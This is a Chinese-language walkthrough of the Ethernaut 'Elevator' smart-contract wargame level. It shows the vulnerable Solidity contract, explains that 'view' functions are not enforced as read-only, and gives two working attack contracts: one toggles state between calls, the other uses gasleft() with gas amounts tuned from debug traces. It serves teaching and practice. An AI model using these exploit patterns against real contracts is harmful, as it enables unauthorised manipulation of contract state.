# Elevator
关于view、pure等合约标签
```solidity
pragma solidity ^0.4.18;


interface Building {
  function isLastFloor(uint) view public returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

### 代码分析
```solidity
if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
```
要使top为true，即building.isLastFloor(_floor)两次调用的结果不同，第一次返回false，第二次返回true。
isLastFloor方法为view方法，该方法应该为只读取state但不修改state，但是这一点并不是强制的，即该方法如果修改
了state也是可以进行调用的。

*注意，也可以使用gasleft()来达成该攻击目的，但不对state进行修改*

### 攻击合约
官方答案：
```solidity
pragma solidity ^0.4.18;

import '../levels/Elevator.sol';

contract ElevatorAttack {
  bool public isLast = true;
  
  function isLastFloor(uint) public returns (bool) {
    isLast = ! isLast;
    return isLast;
  }

  function attack(address _victim) public {
    Elevator elevator = Elevator(_victim);
    elevator.goTo(10);
  }
}
```
使用gasleft:
```solidity
pragma solidity ^0.4.0;
contract GET {
    address addr;
    uint256 gasAmount = 100361;
    function GET() public {
        addr = 0x3359cdfc05ee2569458f6b6f52e721776cb5205e; //instance address
    }
    
    function isLastFloor(uint256 amount) public view returns(bool) {
        if (gasleft() > amount) {
            return true;
        } else {
            return false;
        }
    }
    
    // You can pass a amount between gasleft() first and gasleft() sencond
    // It will also pass the Elevator
    function send(uint256 amount) public {
        addr.gas(gasAmount).call(bytes4(keccak256("goTo(uint256)")), amount);
    }
}
```
关于amount的选定，需要通过实际的执行，通过etherscan上的geth debugtrace来追踪gas的使用情况，从而选择符合条件
的gas数量。

### 攻击方法
#### 使用官方攻击合约
1. 调用官方攻击合约的attack方法

#### 使用gasleft方法
1. 试调用send()方法（第一次可以传一个较大的值），查询到gas的使用情况（gasLimit保持一致），从而选定amount的值
2. 调用send()方法，传入正确的amount